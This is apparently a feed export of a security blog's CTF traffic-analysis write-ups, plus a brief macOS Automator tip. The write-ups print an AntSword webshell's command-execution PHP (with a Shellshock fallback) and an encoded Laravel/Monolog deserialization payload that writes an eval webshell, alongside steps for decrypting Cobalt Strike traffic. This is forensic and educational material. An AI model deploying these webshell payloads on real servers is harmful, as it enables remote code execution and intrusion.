class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">return $out;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function asoutput() &#123;</span><br><span class="line">$output&#x3D;ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">echo &quot;36&quot;.&quot;4f2&quot;;</span><br><span class="line">echo @asenc($output);</span><br><span class="line">echo &quot;42&quot;.&quot;ff1&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">$p&#x3D;base64_decode(substr($_POST[&quot;f861d394170244&quot;],2));</span><br><span class="line">$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br><span class="line">$envstr&#x3D;@base64_decode(substr($_POST[&quot;b430b310838a93&quot;],2));</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$c&#x3D;substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;?&quot;-c \&quot;&#123;$s&#125;\&quot;&quot;:&quot;&#x2F;c \&quot;&#123;$s&#125;\&quot;&quot;;</span><br><span class="line">if(substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;) &#123;</span><br><span class="line">@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;;C:&#x2F;Windows&#x2F;system32;C:&#x2F;Windows&#x2F;SysWOW64;C:&#x2F;Windows;C:&#x2F;Windows&#x2F;System32&#x2F;WindowsPowerShell&#x2F;v1.0&#x2F;;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(!empty($envstr)) &#123;</span><br><span class="line">$envarr&#x3D;explode(&quot;|||asline|||&quot;, $envstr);</span><br><span class="line">foreach($envarr as $v) &#123;</span><br><span class="line">if (!empty($v)) &#123;</span><br><span class="line">@putenv(str_replace(&quot;|||askey|||&quot;, &quot;&#x3D;&quot;, $v));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$r&#x3D;&quot;&#123;$p&#125; &#123;$c&#125;&quot;;</span><br><span class="line">function fe($f) &#123;</span><br><span class="line">$d&#x3D;explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));</span><br><span class="line">if(empty($d)) &#123;</span><br><span class="line">$d&#x3D;array();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$d&#x3D;array_map(&#39;trim&#39;,array_map(&#39;strtolower&#39;,$d));</span><br><span class="line">&#125;</span><br><span class="line">return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function runshellshock($d, $c) &#123;</span><br><span class="line">if (substr($d, 0, 1) &#x3D;&#x3D; &quot;&#x2F;&quot; &amp;&amp; fe(&#39;putenv&#39;) &amp;&amp; (fe(&#39;error_log&#39;) || fe(&#39;mail&#39;))) &#123;</span><br><span class="line">if (strstr(readlink(&quot;&#x2F;bin&#x2F;sh&quot;), &quot;bash&quot;) !&#x3D; FALSE) &#123;</span><br><span class="line">$tmp &#x3D; tempnam(sys_get_temp_dir(), &#39;as&#39;);</span><br><span class="line">putenv(&quot;PHP_LOL&#x3D;() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);</span><br><span class="line">if (fe(&#39;error_log&#39;)) &#123;</span><br><span class="line">error_log(&quot;a&quot;, 1);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">return False;</span><br><span class="line">&#125;</span><br><span class="line">$output &#x3D; @file_get_contents($tmp);</span><br><span class="line">@unlink($tmp);</span><br><span class="line">if ($output !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">print($output);</span><br><span class="line">return True;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return False;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function runcmd($c) &#123;</span><br><span class="line">$ret&#x3D;0;</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">if(fe(&#39;system&#39;)) &#123;</span><br><span class="line">@system($c,$ret);</span><br><span class="line">&#125; elseif(fe(&#39;passthru&#39;)) &#123;</span><br><span class="line">@passthru($c,$ret);</span><br><span class="line">&#125; elseif(fe(&#39;shell_exec&#39;)) &#123;</span><br><span class="line">print(@shell_exec($c));</span><br><span class="line">&#125; elseif(fe(&#39;exec&#39;)) &#123;</span><br><span class="line">@exec($c,$o,$ret);</span><br><span class="line">print(join(&quot;</span><br><span class="line">&quot;,$o));</span><br><span class="line">&#125; elseif(fe(&#39;popen&#39;)) &#123;</span><br><span class="line">$fp&#x3D;@popen($c,&#39;r&#39;);</span><br><span class="line">while(!@feof($fp)) &#123;</span><br><span class="line">print(@fgets($fp,2048));</span><br><span class="line">&#125;</span><br><span class="line">@pclose($fp);</span><br><span class="line">&#125; elseif(fe(&#39;proc_open&#39;)) &#123;</span><br><span class="line">$p &#x3D; @proc_open($c, array(1 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;), 2 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;)), $io);</span><br><span class="line">while(!@feof($io[1])) &#123;</span><br><span class="line">print(@fgets($io[1],2048));</span><br><span class="line">&#125;</span><br><span class="line">while(!@feof($io[2])) &#123;</span><br><span class="line">print(@fgets($io[2],2048));</span><br><span class="line">&#125;</span><br><span class="line">@fclose($io[1]);</span><br><span class="line">@fclose($io[2]);</span><br><span class="line">@proc_close($p);</span><br><span class="line">&#125; elseif(fe(&#39;antsystem&#39;)) &#123;</span><br><span class="line">@antsystem($c);</span><br><span class="line">&#125; elseif(runshellshock($d, $c)) &#123;</span><br><span class="line">return $ret;</span><br><span class="line">&#125; elseif(substr($d,0,1)!&#x3D;&quot;&#x2F;&quot; &amp;&amp; @class_exists(&quot;COM&quot;)) &#123;</span><br><span class="line">$w&#x3D;new COM(&#39;WScript.shell&#39;);</span><br><span class="line">$e&#x3D;$w-&gt;exec($c);</span><br><span class="line">$so&#x3D;$e-&gt;StdOut();</span><br><span class="line">$ret.&#x3D;$so-&gt;ReadAll();</span><br><span class="line">$se&#x3D;$e-&gt;StdErr();</span><br><span class="line">$ret.&#x3D;$se-&gt;ReadAll();</span><br><span class="line">print($ret);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$ret &#x3D; 127;</span><br><span class="line">&#125;</span><br><span class="line">return $ret;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">$ret&#x3D;@runcmd($r.&quot; 2&gt;&amp;1&quot;);</span><br><span class="line">print ($ret!&#x3D;0)?&quot;ret&#x3D;&#123;$ret&#125;&quot;:&quot;&quot;;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception $e) &#123;</span><br><span class="line">echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure><p>We can see that parameter s receive  parameter ufbd335828f30f’s value.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br></pre></td></tr></table></figure><p>so, s=</p><figure class="highlight plain"><figcaption><span>/d "D:\\phpstudy_pro\\WWW\\secret"&"C:\Program Files\7-Zip\7z.exe" x secret.zip -pP4Uk6qkh6Gvqwg3y&echo 378df2c234&cd&echo fb7f8f</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>The password was found,P4Uk6qkh6Gvqwg3y.Then extract beacon_keys file.We can recover serialized private key by  <a href="https://github.com/WBGlIl/CS_Decrypt">https://github.com/WBGlIl/CS_Decrypt</a>.</p><p><img src="http://cdn.polowong.top/1633578377113neqkckzh.png?imageslim" alt="paste image"></p><p>From RSA key we can recover AES key in traffic ,usually the encryped data located in cookie field.</p><p><img src="http://cdn.polowong.top/1633578510720pypykjsw.png?imageslim" alt="paste image"><img src="http://cdn.polowong.top/16336126404051wc58fdp.png?imageslim" alt="paste image"></p><p>From AES key we can recover totally communication contents,according to cobalt strike traffic characetristics,we can get beacon’s task execution results from the pacakage which POST DATA to submit.php?id=xxx.</p><p><img src="http://cdn.polowong.top/163361286315319q01mf9.png?imageslim" alt="paste image"></p><p>Note that data should be base64 format,then use script decode it.</p><p><img src="http://cdn.polowong.top/1633612982627c0it3dfp.png?imageslim" alt="paste image"></p><p>So beacon’s task execution result were shown in above figure, it contains the flag what we want.</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://blog.csdn.net/qq_43264813/article/details/120560209">https://blog.csdn.net/qq_43264813/article/details/120560209</a></p><p><a href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan">https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan</a></p><p><a href="https://www.wkr.moe/ctf/610.html#toc-head-3">https://www.wkr.moe/ctf/610.html#toc-head-3</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Target: &lt;strong&gt;FIND THE FLAG(</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Quick start  Captfencoder in Mac</title>
    <link href="https://polosec.github.io/2021/10/08/Quick-start-Captfencoder-in-Mac/"/>
    <id>https://polosec.github.io/2021/10/08/Quick-start-Captfencoder-in-Mac/</id>
    <published>2021-10-08T07:35:41.000Z</published>
    <updated>2021-10-09T02:44:06.623Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><p>Automator in mac<br>open automator,choose application,search shell on the top<br><img src="http://cdn.polowong.top/1633678583273wpowfu9o.png?imageslim" alt="paste image"><br>then type</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH&#x3D;$PATH:&#x2F;path&#x2F;to&#x2F;npm&#x2F;;cd &#x2F;path&#x2F;to&#x2F;npm&#x2F;apps ;npm start</span><br></pre></td></tr></table></figure><p>Automator doesn’t know the path of npm, so it should be exported frist.<br><img src="http://cdn.polowong.top/1633678772412ykmrga69.png?imageslim" alt="paste image"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Tools&quot;&gt;&lt;a href=&quot;#Tools&quot; class=&quot;headerlink&quot; title=&quot;Tools&quot;&gt;&lt;/a&gt;Tools&lt;/h1&gt;&lt;p&gt;Automator in mac&lt;br&gt;open automator,choose application,sear</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>绿城杯流量分析</title>
    <link href="https://polosec.github.io/2021/10/07/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <id>https://polosec.github.io/2021/10/07/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
    <published>2021-10-07T02:33:09.000Z</published>
    <updated>2021-10-07T13:25:07.241Z</updated>
    
    <content type="html"><![CDATA[<p>这题挺有意思的，还是按流量分析的思路来做，个人习惯先看post包<img src="http://cdn.polowong.top/1633574050565kc7miz95.png?imageslim" alt="paste image">在这里看到了很多ignition之类的包，百度了下这是一个laravel的RCE。后面的包一直在向.config.php post数据，怀疑config.php是写的马，跟进去看看。使用http contains config过滤出来。<img src="http://cdn.polowong.top/16335741885165rs7bwkh.png?imageslim" alt="paste image">很明显是webshell了，这是在执行ls<img src="http://cdn.polowong.top/1633574233022a3e3z8xv.png?imageslim" alt="paste image">继续跟踪这个webshell的数据包，看看有无有价值的信息。<img src="http://cdn.polowong.top/1633574349937r8r9xs6k.png?imageslim" alt="paste image">看到了一个secret.zip，但是http对象导出并没有这玩意。继续追踪看到了pk开头的一段数据，考虑是压缩包，尝试进行还原。<img src="http://cdn.polowong.top/16335744113565ygjm6if.png?imageslim" alt="paste image">需要注意的是，压缩包前后有两段字符串是蚁剑自带干扰流量特征的。还原之后是个加密的压缩包，不是伪加密，下一步的目的是找到压缩包的密码。同时需要注意的是，这里文件名和cobalt strike有关（rt废物狂喜），然后搜了下.cobaltstrike.beacon_keys这个东西是干嘛的。上述文件是一个序列化后的公钥私钥文件，CS的beacon会嵌入这个文件中的公钥，当然了，私钥是留给server自己的。下一步应该是对这个文件进行解密，获取CS的通信数据。既然知道了是cobalt strike的通信流量，那么需要找到beacon与teamserver交互的数据包，但这个前提是得到私钥。获取私钥的前提是解开压缩包的密码。下面需要做的是找压缩包的密码。<img src="http://cdn.polowong.top/163357529132181rdbcyd.png?imageslim" alt="paste image">继续追踪数据包，在上面的包中看到了解压的操作。但是当时我直接对传输的数据进行URL+BASE64解码，并不能得到任何有价值的信息。那么接下来需要做的是看一看传的马的内容以及加密方式。在laravel RCE的包中可以找到payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00+&#x3D;00D&#x3D;00Q&#x3D;00o&#x3D;00J&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00y&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00Y&#x3D;00T&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;00n&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00z&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00V&#x3D;00j&#x3D;00a&#x3D;00G&#x3D;008&#x3D;00g&#x3D;00X&#x3D;00j&#x3D;00w&#x3D;00&#x2F;&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00E&#x3D;00B&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00F&#x3D;00s&#x3D;00K&#x3D;00E&#x3D;00B&#x3D;00n&#x3D;00e&#x3D;00m&#x3D;00l&#x3D;00u&#x3D;00Z&#x3D;00m&#x3D;00x&#x3D;00h&#x3D;00d&#x3D;00G&#x3D;00U&#x3D;00o&#x3D;00Y&#x3D;00m&#x3D;00F&#x3D;00z&#x3D;00Z&#x3D;00T&#x3D;00Y&#x3D;000&#x3D;00X&#x3D;002&#x3D;00R&#x3D;00l&#x3D;00Y&#x3D;002&#x3D;009&#x3D;00k&#x3D;00Z&#x3D;00S&#x3D;00g&#x3D;00k&#x3D;00X&#x3D;001&#x3D;00B&#x3D;00P&#x3D;00U&#x3D;001&#x3D;00R&#x3D;00b&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;000&#x3D;00M&#x3D;00z&#x3D;00N&#x3D;00d&#x3D;00K&#x3D;00S&#x3D;00k&#x3D;00p&#x3D;00O&#x3D;00z&#x3D;009&#x3D;00e&#x3D;00P&#x3D;00i&#x3D;00A&#x3D;00+&#x3D;00I&#x3D;00C&#x3D;005&#x3D;00j&#x3D;00b&#x3D;002&#x3D;005&#x3D;00m&#x3D;00a&#x3D;00W&#x3D;00c&#x3D;00u&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00U&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00x&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00V&#x3D;00s&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00O&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;004&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00p&#x3D;00b&#x3D;00m&#x3D;00l&#x3D;000&#x3D;00a&#x3D;00W&#x3D;00F&#x3D;00s&#x3D;00a&#x3D;00X&#x3D;00p&#x3D;00l&#x3D;00Z&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00Y&#x3D;00j&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00k&#x3D;00x&#x3D;00p&#x3D;00b&#x3D;00W&#x3D;00l&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00i&#x3D;000&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00H&#x3D;00B&#x3D;00y&#x3D;00b&#x3D;002&#x3D;00N&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00N&#x3D;00v&#x3D;00c&#x3D;00n&#x3D;00M&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00o&#x3D;00i&#x3D;00Y&#x3D;003&#x3D;00V&#x3D;00y&#x3D;00c&#x3D;00m&#x3D;00V&#x3D;00u&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00c&#x3D;003&#x3D;00l&#x3D;00z&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00t&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;001&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;003&#x3D;00O&#x3D;003&#x3D;000&#x3D;00F&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00Z&#x3D;00H&#x3D;00V&#x3D;00t&#x3D;00b&#x3D;00X&#x3D;00k&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00I&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00C&#x3D;005&#x3D;000&#x3D;00e&#x3D;00H&#x3D;00Q&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00D&#x3D;00Z&#x3D;006&#x3D;00P&#x3D;00U&#x3D;00p&#x3D;00j&#x3D;00h&#x3D;00k&#x3D;00a&#x3D;00y&#x3D;00y&#x3D;00N&#x3D;00i&#x3D;00Q&#x3D;003&#x3D;00Y&#x3D;00w&#x3D;00m&#x3D;00f&#x3D;00p&#x3D;00c&#x3D;008&#x3D;00Q&#x3D;00J&#x3D;00n&#x3D;00s&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00E&#x3D;00d&#x3D;00C&#x3D;00T&#x3D;00U&#x3D;00I&#x3D;00&#x3D;00</span><br></pre></td></tr></table></figure><p>把payload中的=00替换为空然后解base64可以得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php __HALT_COMPILER(); ?&gt;</span><br><span class="line">�a:2:&#123;i:7;O:32:&quot;Monolog\Handler\SyslogUdpHandler&quot;:1:&#123;s:9:&quot;*socket&quot;;O:29:&quot;Monolog\Handler\BufferHandler&quot;:7:&#123;s:10:&quot;*handler&quot;;r:3;s:13:&quot;*bufferSize&quot;;i:-1;s:9:&quot;*buffer&quot;;a:1:&#123;i:0;a:2:&#123;i:0;s:77:&quot;echo ^&lt;?php @eval(@gzinflate(base64_decode($_POST[14433])));?^&gt; &gt; .config.php&quot;;s:5:&quot;level&quot;;N;&#125;&#125;s:8:&quot;*level&quot;;N;s:14:&quot;*initialized&quot;;b:1;s:14:&quot;*bufferLimit&quot;;i:-1;s:13:&quot;*processors&quot;;a:2:&#123;i:0;s:7:&quot;current&quot;;i:1;s:6:&quot;system&quot;;&#125;&#125;&#125;i:7;i:7;&#125;dummy\KKa~ضtest.txt\KKa~ضtesttest6z&#x3D;Jc�F��ؐ݌&amp;~�&lt;@��GBMB</span><br></pre></td></tr></table></figure><p>这写进去的应该是一个序列化对象，应该是和laravel的rce有关，我们重点关注传进去的内容。@eval(@gzinflate(base64_decode($_POST[14433])));所以需要做gzip和base64的解码才可以明白流量包中的具体内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">14433&#x3D;c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD&#x2F;APDomON6gwSDFJNUpJNUs2TEs0j9XU1LQGAA&#x3D;&#x3D;</span><br><span 